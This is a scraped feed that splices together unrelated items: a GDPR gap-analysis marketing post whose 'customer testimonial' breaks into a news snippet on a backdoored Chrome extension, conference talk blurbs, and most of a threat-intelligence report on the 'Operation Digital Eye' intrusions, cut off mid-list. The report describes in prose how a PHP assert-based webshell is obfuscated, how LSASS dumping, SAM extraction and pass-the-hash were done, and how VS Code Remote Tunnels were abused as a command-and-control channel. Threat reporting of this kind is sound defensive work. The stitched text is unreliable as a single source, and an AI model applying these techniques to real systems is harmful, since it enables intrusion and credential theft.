&lt;p&gt;However, compliance isn’t a one-off activity – it’s something to &lt;em&gt;maintain&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;CyberComply&lt;/a&gt;&lt;/strong&gt; can help with this. In just one powerful tool, you can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Manage your GDPR compliance gaps;&lt;/li&gt;



&lt;li&gt;Map data flows;&lt;/li&gt;



&lt;li&gt;Automate ROPA creation; and&lt;/li&gt;



&lt;li&gt;Increase efficiency and minimise errors when conducting DPIAs.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Want to see what else the tool can do?&lt;/p&gt;

&lt;/div&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Don’t take our word for it&lt;/h3&gt;



&lt;p&gt;Here’s what our customers say:&lt;/p&gt;



&lt;p&gt;Nikolaus:&lt;/p&gt;

&lt;p&gt;The compromises came to light with the &lt;a href="https://www.vulnu.com/p/breaking-cyberhaven-chrome-extension-compromised"&gt;discovery&lt;/a&gt; by data loss prevention service Cyberhaven that a Chrome extension used by &lt;a href="https://web.archive.org/web/20241227171802/https://chromewebstore.google.com/detail/cyberhaven-security-exten/pajkjnmeojmbapicmbpliphjmcekeaac"&gt;400,000&lt;/a&gt; of its customers had been updated with code that stole their sensitive data.&lt;/p&gt;
&lt;h2&gt;’Twas the night before Christmas&lt;/h2&gt;
&lt;p&gt;The malicious extension, available as version 24.10.4, was available for 31 hours, from December 25 at 1:32 AM UTC to Dec 26 at 2:50 AM UTC. Chrome browsers actively running Cyberhaven during that window would automatically download and install the malicious code. Cyberhaven responded by issuing version 24.10.5, and 24.10.6 a few days later.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/dozens-of-backdoored-chrome-extensions-discovered-on-2-6-million-devices/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

In contrast to most other threat actors, ransomware operators rely on and leverage public visibility into their activities. Unlike APTs and other threat actors that prize stealth, ransomware gangs seek to publicize their attacks in order to convince future victims that they are trustworthy enough to deliver on their promises &amp;#8211; providing a decryptor and deleting stolen data &amp;#8211; if paid.&lt;/p&gt;
&lt;p&gt;In &amp;#8216;The Ransomware Trust Paradox&amp;#8217;, Max observes that this notion of trust is not only a prerequisite for ransomware gangs&amp;#8217; profitability but also relies on media and security vendor reporting. Detailing the mechanisms by which ransomware operators establish trust, build brand awareness, and foster a reputation for reliability, this talk is essential viewing for anyone reporting on crimeware activities.&lt;/p&gt;
&lt;p&gt;Max calls for the establishment of a reporting code of ethics for threat intelligence and the media, and a shift in policy to undermine the trust dynamics between threat actors and their victims.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

Pair this with predatory pricing models from software vendors that sell security features as add-on products in premium or enterprise tier licenses, and you’ve got a perfect storm that hits small and medium sized businesses (SMBs) the hardest.&lt;/p&gt;
&lt;p&gt;In this hard-hitting talk, &lt;a href="https://www.linkedin.com/in/kymberleeprice/" rel="noopener" target="_blank"&gt;Kymberlee Price&lt;/a&gt; reveals the technical chaos facing the US’s largest employment sector: SMBs. With restricted budgets, a lack of expertise, no access to consumer reports by which to clearly compare products, and a SaaS industry that makes basic security features like SSO a premium add-on, many businesses remain easy pickings for threat actors in a rapidly expanding crimeware landscape.&lt;/p&gt;
&lt;p&gt;Why should we care about this, is it really a national threat, and what can a bunch of security engineers do about it?&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-a-gdpr-gap-analysis-helps-secure-support-from-senior-management"&gt;How a GDPR Gap Analysis Helps Secure Support From Senior Management&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;GDPR gap analysis data shows compliance in the UK is “quite low”&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;When implementing a &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;GDPR (General Data Protection Regulation)&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; compliance programme, a key challenge is securing the required resources and support – particularly from top management.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yet GDPR compliance brings business benefits beyond mitigating the risk of data breaches and &lt;a href="https://www.itgovernance.co.uk/dpa-and-gdpr-penalties" rel="noreferrer noopener" target="_blank"&gt;fines&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;You’ll stop duplicating work, improving productivity.&lt;/li&gt;



&lt;li&gt;You can better tie down the requirements for RBAC (role-based &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;).&lt;/li&gt;



&lt;li&gt;You can clearly define roles and responsibilities in job descriptions and other documentation.&lt;/li&gt;



&lt;li&gt;Your information will be more organised, so you can find what you need quicker, and with greater confidence in its accuracy.&lt;/li&gt;



&lt;li&gt;You’ll get rid of data you don’t need, in line with your retention policy. That saves storage space and costs, and gives you more accurate insights into your data.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;The value of a gap analysis&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;But how can you get management to understand these benefits, and more to the point, understand how far away the organisation is from compliance?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-gap-analysis" rel="noreferrer noopener" target="_blank"&gt;GDPR gap analysis&lt;/a&gt; offers a useful tool here – particularly if conducted by an independent third party.&lt;/p&gt;



&lt;p&gt;A gap analysis (or ‘gap assessment’) compares an organisation’s current measures against an ideal ‘target state’ – in this case, GDPR compliance.&lt;/p&gt;



&lt;p&gt;Gap analyses typically produce a report following the assessment, often with a prioritised action plan, that can function as a ‘reality check’ to management. It can help support your case to the board for needing extra resources.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;GDPR compliance in the UK: “quite low”&lt;/h2&gt;



&lt;p&gt;DQM GRC’s &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; – based on gap analysis data – shows that &lt;strong&gt;many UK organisations have significant room for improvement when it comes to GDPR compliance&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;The average score was 5.3, which DQM GRC described as “quite low”.&lt;/p&gt;



&lt;p&gt;That said, the report also found that, on average, organisations performed better in certain GDPR compliance areas over others.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Privacy by design&lt;/h3&gt;



&lt;p&gt;For instance, the report found that privacy by design is the weakest compliance area.&lt;/p&gt;



&lt;p&gt;This may be because organisations are less likely to treat privacy risks as business risks – yet privacy by design improves business projects, because they make for simpler, more user-friendly software (or more customer-friendly products and services).&lt;/p&gt;



&lt;p&gt;When you think about what data should be available to each process, you both improve your level of data security &lt;em&gt;and&lt;/em&gt; force designers to take the time to consider what the process needs to do and why.&lt;/p&gt;



&lt;p&gt;&lt;em&gt;(This is also key to &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;effective control selection&lt;/em&gt;&lt;/a&gt;&lt;em&gt; in information security.)&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;Privacy by design also brings less conspicuous benefits:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;It requires &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;better documentation&lt;/a&gt;, which makes your projects easier to manage and, when you need it, will make &lt;a href="https://www.itgovernance.co.uk/bc-dr" rel="noreferrer noopener" target="_blank"&gt;disaster recovery&lt;/a&gt; easier.&lt;/li&gt;



&lt;li&gt;Because you’ll need to look further ahead as you plan your project, it helps create more efficient processes and systems.&lt;/li&gt;



&lt;li&gt;It also ensures you keep your data in appropriate formats ready for future use, and prevents you from using personal data in ways you shouldn’t.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, privacy by design is something you &lt;em&gt;should&lt;/em&gt; be doing, irrespective of any legal requirements.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Information security&lt;/h3&gt;



&lt;p&gt;Meanwhile, the &lt;a href="https://www.dqmgrc.com/resources/gdpr-benchmark-report" rel="noreferrer noopener" target="_blank"&gt;GDPR Benchmark Report 2024&lt;/a&gt; found that organisations perform better on information security (compliance area ‘ISMS’ – information security management system).&lt;/p&gt;



&lt;p&gt;DQM GRC suggested this is due to information and cyber security issues being more prone to receiving negative press than data protection issues, so organisations are more likely to treat cyber security risks as business risks.&lt;/p&gt;



&lt;p&gt;Damian Garcia, our head of GRC (governance, risk and compliance) consultancy, added:&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;Another possibility for this finding is that prior to 2018 [when the GDPR was enforced], organisations – particularly smaller businesses – may have struggled to justify expenditure on security.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In part, this was due to their attitude, often along the lines of: “Who would want to steal our data? It isn’t worth anything.”&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;In other words, business owners struggled to attribute a value to their data.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;But when the GDPR was introduced, organisations could more easily place a value on the personal data they were holding: the greater of €20 million [now £17.5 million under the UK GDPR] or 4% of annual global turnover.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;This may have helped convince management for the need to invest in security controls, and perhaps even implement an &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;ISO 27001&lt;/em&gt;&lt;/a&gt;&lt;em&gt;-compliant ISMS.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;From late June to mid-July 2024, a suspected China-nexus threat actor targeted large business-to-business IT service providers in Southern Europe, an activity cluster that we dubbed ‘Operation Digital Eye’.&lt;/li&gt;
&lt;li&gt;The intrusions could have enabled the adversaries to establish strategic footholds and compromise downstream entities. SentinelLabs and Tinexta Cyber detected and interrupted the activities in their initial phases.&lt;/li&gt;
&lt;li&gt;The threat actors used a lateral movement capability indicative of the presence of a shared vendor or digital quartermaster maintaining and provisioning tooling within the Chinese APT ecosystem.&lt;/li&gt;
&lt;li&gt;The threat actors abused Visual Studio Code and Microsoft Azure infrastructure for C2 purposes, attempting to evade detection by making malicious activities appear legitimate.&lt;/li&gt;
&lt;li&gt;Our visibility suggests that the abuse of Visual Studio Code for C2 purposes had been relatively rare in the wild prior to this campaign. Operation Digital Eye marks the first instance of a suspected Chinese APT group using this technique that we have directly observed.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;Tinexta Cyber and SentinelLabs have been tracking threat activities targeting business-to-business IT service providers in Southern Europe. Based on the malware, infrastructure, techniques used, victimology, and the timing of the activities, we assess that it is highly likely these attacks were conducted by a China-nexus threat actor with cyberespionage motivations.&lt;/p&gt;
&lt;p&gt;The relationships between European countries and China are complex, characterized by cooperation, competition, and underlying tensions in areas such as trade, investment, and technology. Suspected China-linked cyberespionage groups &lt;a href="https://cert.europa.eu/static/files/TLP-CLEAR-JointPublication-23-01.pdf" rel="noopener noreferrer" target="_blank"&gt;frequently&lt;/a&gt; &lt;a href="https://cert.europa.eu/publications/threat-intelligence/cb24-08/" rel="noopener noreferrer" target="_blank"&gt;target&lt;/a&gt; public and private organizations across Europe to gather strategic intelligence, gain competitive advantages, and advance geopolitical, economic, and technological interests.&lt;/p&gt;
&lt;p&gt;The attack campaign, which we have dubbed Operation Digital Eye, took place from late June to mid-July 2024, lasting approximately three weeks. The targeted organizations provide solutions for managing data, infrastructure, and cybersecurity for clients across various industries, making them prime targets for cyberespionage actors.&lt;/p&gt;
&lt;p&gt;A sustained presence within these organizations would provide the Operation Digital Eye actors with a strategic foothold, creating opportunities for intrusions across the digital supply chain and enabling them to exert control over critical IT processes within the downstream compromised entities. The attacks were detected and disrupted during their initial phases.&lt;/p&gt;
&lt;p&gt;The exact group behind Operation Digital Eye remains unclear due to the extensive &lt;a href="https://www.sentinelone.com/labs/chinese-entanglement-dll-hijacking-in-the-asian-gambling-sector/" rel="noopener noreferrer" target="_blank"&gt;sharing&lt;/a&gt; of malware, operational playbooks, and infrastructure management processes within the Chinese threat landscape. The threat actors used a pass-the-hash capability, likely originating from the same source as closed-source custom Mimikatz modifications observed exclusively in suspected Chinese cyberespionage activities, such as &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt; and &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt;. The malware and tooling used in these campaigns have been &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;linked &lt;/a&gt;to several distinct Chinese APT groups. We collectively refer to these custom Mimikatz modifications as mimCN.&lt;/p&gt;
&lt;p&gt;The long-term evolution and versioning of mimCN samples, along with notable features such as instructions left for a separate team of operators, suggest the involvement of a shared vendor or digital quartermaster responsible for the active maintenance and provisioning of tooling. This function within the Chinese APT ecosystem, corroborated by the &lt;a href="https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/" rel="noopener noreferrer" target="_blank"&gt;I-Soon leak&lt;/a&gt;, likely plays a key role in facilitating China-nexus cyberespionage operations.&lt;/p&gt;
&lt;p&gt;The abuse of &lt;a href="https://code.visualstudio.com/" rel="noopener noreferrer" target="_blank"&gt;Visual Studio Code&lt;/a&gt; &lt;a href="https://code.visualstudio.com/docs/remote/tunnels" rel="noopener noreferrer" target="_blank"&gt;Remote Tunnels&lt;/a&gt; for C2 purposes is central to this campaign. Originally designed to enable remote development, this technology provides full endpoint access, including command execution and filesystem manipulation. Additionally, Visual Studio Code tunneling involves executables signed by Microsoft and Microsoft Azure network infrastructure, both of which are often not closely monitored and are typically allowed by application controls and firewall rules. As a result, this technique may be challenging to detect and could evade security defenses. Combined with the full endpoint access it provides, this makes Visual Studio Code tunneling an attractive and powerful capability for threat actors to exploit.&lt;/p&gt;
&lt;p&gt;Tinexta Cyber and SentinelLabs have notified Microsoft about the abuse of Visual Studio Code and Azure infrastructure in connection with Operation Digital Eye.&lt;/p&gt;
&lt;h2&gt;Infection Vector and Attack Progression&lt;/h2&gt;
&lt;p&gt;The attackers used SQL (Structured Query Language) injection as an initial access vector to infiltrate Internet-facing web and database servers. &lt;code&gt;User-Agent&lt;/code&gt; request headers in the web traffic logs we retrieved indicate that the attackers used the &lt;a href="https://sqlmap.org/" rel="noopener noreferrer" target="_blank"&gt;sqlmap&lt;/a&gt; tool to automate the detection and exploitation of SQL injection vulnerabilities.&lt;/p&gt;
&lt;p&gt;To establish an initial foothold and maintain persistent access, the threat actors deployed a PHP-based webshell. Relatively simple in design and implementation, the webshell uses the &lt;a href="https://www.php.net/manual/en/function.assert.php" rel="noopener noreferrer" target="_blank"&gt;assert&lt;/a&gt; function to execute attacker-provided PHP code. Its implementation does not resemble any other webshells we are familiar with. We track this webshell under the name PHPsert.&lt;/p&gt;
&lt;p&gt;To disguise the files implementing PHPsert and attempt to evade detection based on filesystem activity, the attackers used custom names tailored to the infiltrated environments, making the filenames appear legitimate. This included using the local language and terms that aligned with the technological context of the targeted organizations.&lt;/p&gt;
&lt;p&gt;After establishing an initial foothold, the threat actors conducted reconnaissance using a variety of third-party tools and built-in Windows utilities, such as &lt;a href="https://joeware.net/freetools/tools/getuserinfo/index.htm" rel="noopener noreferrer" target="_blank"&gt;GetUserInfo&lt;/a&gt; and &lt;code&gt;ping&lt;/code&gt;. They also deployed the &lt;code&gt;local.exe&lt;/code&gt; tool, which is part of the Microsoft Windows NT Resource Kit and allows for viewing user group memberships.&lt;/p&gt;
&lt;p&gt;To steal credentials, the attackers used the &lt;code&gt;CreateDump&lt;/code&gt; tool to &lt;a href="https://lolbas-project.github.io/lolbas/OtherMSBinaries/Createdump/" rel="noopener noreferrer" target="_blank"&gt;extract&lt;/a&gt; memory allocated to the Local Security Authority Subsystem Service (LSASS) process and exfiltrate credentials. &lt;code&gt;CreateDump&lt;/code&gt; is part of the Microsoft .NET Framework distribution. The threat actors also retrieved credentials from the Security Account Manager (SAM) database, which they extracted from the Windows Registry using the &lt;code&gt;reg save&lt;/code&gt; &lt;a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save" rel="noopener noreferrer" target="_blank"&gt;command&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The threat actors frequently named the files they deployed using the pattern &lt;code&gt;do.*&lt;/code&gt;. Examples include &lt;code&gt;do.log&lt;/code&gt; (output from &lt;code&gt;ping&lt;/code&gt; commands), &lt;code&gt;do.exe&lt;/code&gt; (the &lt;code&gt;CreateDump&lt;/code&gt; tool), and &lt;code&gt;do.bat&lt;/code&gt; (a script that executes and deletes the &lt;code&gt;CreateDump&lt;/code&gt; executable).&lt;/p&gt;
&lt;p&gt;From the initially compromised endpoints, the attackers moved laterally across the internal network, primarily using RDP (Remote Desktop Protocol) connections and pass-the-hash techniques. For the pass-the-hash attacks, they used a custom modified version of Mimikatz, implemented in an executable named &lt;code&gt;bK2o.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;In addition to the PHPsert webshell, the threat actors used two methods for remote command execution: SSH access, enabled by deploying &lt;code&gt;authorized_keys&lt;/code&gt; files containing public keys for authentication, and Visual Studio Code Remote Tunnels.&lt;/p&gt;
&lt;p&gt;Visual Studio Code Remote Tunnels, based on Microsoft’s &lt;a href="https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview" rel="noopener noreferrer" target="_blank"&gt;dev tunnel&lt;/a&gt; technology, enable developers to access and work on remote systems. This access includes the command terminal and file system, allowing activities such as command execution and file editing. The Operation Digital Eye actors abused this functionality to maintain persistent backdoor access to compromised systems.&lt;/p&gt;
&lt;p&gt;In an attempt to evade detection based on filesystem activity, the threat actors used &lt;code&gt;%SystemRoot%\Temp&lt;/code&gt; and &lt;code&gt;%ProgramData%\Visual Studio Code&lt;/code&gt; as their primary working directories for storing tools and data. &lt;code&gt;%SystemRoot%\Temp&lt;/code&gt; is a directory where Windows stores temporary files and is often monitored with less scrutiny. &lt;code&gt;%ProgramData%\Visual Studio Code&lt;/code&gt; was intended to appear as a legitimate directory associated with Visual Studio Code.&lt;/p&gt;
&lt;p&gt;The intrusions were detected and interrupted before the attackers could proceed to further phases, such as exfiltrating data.&lt;/p&gt;
&lt;h2&gt;Abuse of Visual Studio Code&lt;/h2&gt;
&lt;p&gt;The threat actors deployed a portable Visual Studio Code executable named &lt;code&gt;code.exe&lt;/code&gt;, which is digitally signed by Microsoft, and used the &lt;a href="https://github.com/winsw/winsw" rel="noopener noreferrer" target="_blank"&gt;winsw&lt;/a&gt; tool to run it as a Windows service. The &lt;code&gt;winsw&lt;/code&gt; configuration file we retrieved indicates that the attackers created a service named &lt;code&gt;Visual Studio Code Service&lt;/code&gt;, which executes &lt;code&gt;code.exe&lt;/code&gt; with the &lt;code&gt;tunnel&lt;/code&gt; command-line parameter at every system startup.&lt;/p&gt;
&lt;p&gt;The configuration file reveals a pragmatic approach by the threat actors, who likely modified a &lt;a href="https://github.com/winsw/winsw/blob/v3/samples/complete.xml" rel="noopener noreferrer" target="_blank"&gt;publicly available&lt;/a&gt; &lt;code&gt;winsw&lt;/code&gt; configuration. This is suggested by the use of the &lt;code&gt;myapp&lt;/code&gt; service identifier and the &lt;code&gt;%BASE%\logs&lt;/code&gt; directory for storing &lt;code&gt;winsw&lt;/code&gt; log files, both of which appear in the public configuration file as well as in the one we retrieved.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109546" style="width: 852px;"&gt;&lt;img alt="winsw configuration file" class="size-full wp-image-109546" height="396" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye13.jpg" width="852" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109546"&gt;winsw configuration file&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;tunnel&lt;/code&gt; parameter instructs Visual Studio Code to create a dev tunnel and act as a server to which remote users can connect. After &lt;a href="https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/security" rel="noopener noreferrer" target="_blank"&gt;authenticating&lt;/a&gt; to the tunnel with a Microsoft or GitHub account, remote users can access the endpoint running the Visual Studio Code server, either through the Visual Studio Code desktop application or the browser-based version, &lt;a href="https://vscode.dev/" rel="noopener noreferrer" target="_blank"&gt;vscode.dev&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;After creating the dev tunnels, the threat actors authenticated using GitHub accounts and accessed the compromised endpoints through the browser-based version of Visual Studio Code. We have no knowledge of whether the threat actors used self-registered or compromised GitHub accounts to authenticate to the tunnels.&lt;/p&gt;
&lt;h2&gt;Network Infrastructure&lt;/h2&gt;
&lt;p&gt;The Operation Digital Eye actors used infrastructure located exclusively within Europe, sourced from the provider M247 and the Cloud platform Microsoft Azure. This was likely part of a deliberate strategy. Since the targeted organizations are based and operate within Europe, the attackers may have aimed to minimize suspicion by aligning their infrastructure&amp;#8217;s location with that of their targets. Additionally, Cloud infrastructure commonly used in legitimate IT workflows, such as Microsoft Azure, is often not closely monitored and is frequently allowed through firewall restrictions. By leveraging public Cloud infrastructure for malicious purposes, the attackers made the traffic appear legitimate, which can be challenging to detect and may evade security defenses.&lt;/p&gt;
&lt;p&gt;In the initial phases of the attacks, the threat actors used the server with IP address &lt;code&gt;146.70.161[.]78&lt;/code&gt; to establish initial access by detecting and exploiting SQL injection vulnerabilities, and the server with IP address &lt;code&gt;185.76.78[.]117&lt;/code&gt; to operate the PHPsert webshell. Both IP addresses are allocated to the infrastructure provider M247 and are located in Poland and Italy, respectively.&lt;/p&gt;
&lt;p&gt;In the later phases of the attacks, the threat actors used the server with IP address &lt;code&gt;4.232.170[.]137&lt;/code&gt; for C2 purposes when remotely accessing compromised endpoints via the SSH protocol. This server is part of Microsoft&amp;#8217;s Azure infrastructure in the &lt;code&gt;Italy North&lt;/code&gt; &lt;a href="https://learn.microsoft.com/en-us/azure/virtual-machines/regions" rel="noopener noreferrer" target="_blank"&gt;datacenter region&lt;/a&gt; (&lt;a href="https://www.microsoft.com/en-us/download/details.aspx?id=56519" rel="noopener noreferrer" target="_blank"&gt;Azure IP range&lt;/a&gt;: &lt;code&gt;4.232.128[.]0/18&lt;/code&gt;, &lt;a href="https://learn.microsoft.com/en-us/azure/virtual-network/service-tags-overview" rel="noopener noreferrer" target="_blank"&gt;service tag&lt;/a&gt;: &lt;code&gt;AzureCloud.italynorth&lt;/code&gt;). We currently have no information on whether the threat actors used self-registered or compromised Azure credentials to access and manage the Azure resources and services.&lt;/p&gt;
&lt;p&gt;The abuse of Visual Studio Code tunneling for C2 purposes also relies on Microsoft Azure infrastructure. Creating and hosting a dev tunnel requires connecting to a Microsoft Azure server with a domain of &lt;code&gt;*.[clusterID].devtunnels.ms&lt;/code&gt;, where &lt;code&gt;[clusterID]&lt;/code&gt; corresponds to the Azure region of the endpoint running the Visual Studio Code server, &lt;a href="https://global.rel.tunnels.api.visualstudio.com/api/v1/clusters" rel="noopener noreferrer" target="_blank"&gt;such as&lt;/a&gt; &lt;code&gt;euw&lt;/code&gt; for &lt;code&gt;West Europe&lt;/code&gt;. In Operation Digital Eye, the creation of dev tunnels involved establishing connections to the server with the domain &lt;code&gt;[REDACTED].euw.devtunnels[.]ms&lt;/code&gt;, which resolved to the IP address &lt;code&gt;20.103.221[.]187&lt;/code&gt;. This server is part of Microsoft&amp;#8217;s Azure infrastructure in the &lt;code&gt;West Europe&lt;/code&gt; datacenter region (Azure IP range: &lt;code&gt;20.103.0[.]0/16&lt;/code&gt;, service tag: &lt;code&gt;AzureCloud.westeurope&lt;/code&gt;).&lt;/p&gt;
&lt;h2&gt;The PHPsert Webshell&lt;/h2&gt;
&lt;p&gt;PHPsert executes attacker-provided PHP code using the &lt;a href="https://www.php.net/manual/en/function.assert.php" rel="noopener noreferrer" target="_blank"&gt;assert&lt;/a&gt; function, which, in PHP versions prior to 8.0.0, interprets and runs parameter strings as PHP code. To hinder static analysis and evade detection, the webshell uses various code obfuscation techniques, including XOR encoding, hexadecimal character representation, string concatenation, and randomized variable names.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109540" style="width: 664px;"&gt;&lt;img alt="PHPsert implementation" class="size-full wp-image-109540" height="434" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye3.jpg" width="664" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109540"&gt;PHPsert implementation&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The PHPsert webshell operates as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHPsert instantiates a class with a single regular method, which XOR-decodes and concatenates hexadecimal characters to generate the string &lt;code&gt;assert&lt;/code&gt;. The class&amp;#8217;s destructor (the magic method &lt;code&gt;__destruct&lt;/code&gt;) uses this string to invoke the &lt;code&gt;assert&lt;/code&gt; function, passing attacker-provided PHP code as a parameter.&lt;/li&gt;
&lt;li&gt;The webshell retrieves the attacker-provided PHP code from an HTTP POST request parameter, for example, &lt;code&gt;momomomo&lt;/code&gt;. If the &lt;code&gt;id&lt;/code&gt; parameter is present in the request URL, PHPsert decodes the Base64-encoded value of the POST parameter. If the &lt;code&gt;id&lt;/code&gt; parameter is absent, the webshell uses the raw value of the parameter.&lt;/li&gt;
&lt;li&gt;Finally, when PHPsert finishes executing, the class&amp;#8217;s destructor is invoked, which in turn calls the &lt;code&gt;assert&lt;/code&gt; function to execute the attacker-provided PHP code.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We identified multiple PHPsert variants, which have been submitted to malware sharing platforms since May 2023, from various locations including Japan, Singapore, Peru, Taiwan, Iran, Korea, and the Philippines. These variants show only minor differences in their implementation, such as varying variable names and POST request parameters like &lt;code&gt;mr6&lt;/code&gt;, &lt;code&gt;brute&lt;/code&gt;, and &lt;code&gt;qq&lt;/code&gt;. Our analysis suggests that PHPsert is deployed not only as a standalone PHP file but is also integrated into various types of web content, including web text editors and content management systems.&lt;/p&gt;
&lt;p&gt;One of the PHPsert variants contains commented-out code snippets and comments in simplified Chinese that describe nearby code. These comments and snippets are not present in the PHPsert versions observed in Operation Digital Eye, nor in any of the webshell’s other variants. Below are the code comments, all of which are machine-translated from simplified Chinese:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;结果是"assert"&lt;/code&gt;, which translates to &lt;code&gt;The result is "assert"&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;验证 $this-&gt;rg 是否安全&lt;/code&gt;, which translates to &lt;code&gt;Verify that $this-&gt;rg is safe&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;验证和清理用户输入&lt;/code&gt;, which translates to &lt;code&gt;Validating and sanitizing user input&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter size-full wp-image-109545" height="196" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye14.jpg" width="382" /&gt;&lt;br /&gt;
&lt;img alt="" class="aligncenter size-full wp-image-109541" height="119" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye2.jpg" width="580" /&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109548" style="width: 671px;"&gt;&lt;img alt="PHPsert code snippets with comments in Chinese" class="size-full wp-image-109548" height="45" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye11.jpg" width="671" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109548"&gt;PHPsert code snippets with comments in Chinese&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The presence of these comments, along with the indicators of removed code across PHPsert variants, suggests the potential involvement of Chinese-speaking developers who may have been simplifying the webshell&amp;#8217;s execution logic.&lt;/p&gt;
&lt;h2&gt;Pass-the-Hash Capability&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;bK2o.exe&lt;/code&gt; executable (a custom modified version of Mimikatz used in Operation Digital Eye for pass-the-hash attacks) enables the execution of processes within a user&amp;#8217;s security context by leveraging a compromised NTLM password hash, bypassing the need for the user’s actual password. To achieve this, &lt;code&gt;bK2o.exe&lt;/code&gt; overwrites memory of the LSASS process. The tool supports the following command-line parameters:&lt;/p&gt;
&lt;ul&gt;
